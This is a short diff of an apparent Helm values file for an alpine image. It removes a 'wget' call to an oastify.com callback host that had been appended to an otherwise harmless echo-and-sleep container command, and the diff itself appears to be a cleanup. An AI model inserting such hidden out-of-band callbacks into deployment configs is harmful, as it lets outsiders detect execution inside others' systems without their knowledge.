@@ -1,4 +1,4 @@
-command: "echo Hello from Helm && sleep 20 && echo done && wget f4k8bqbm73n0wzvqqjggsjnnfel59vxk.oastify.com"
+command: "echo Hello from Helm && sleep 20 && echo done"
 image:
   repository: alpine
   tag: 3.18
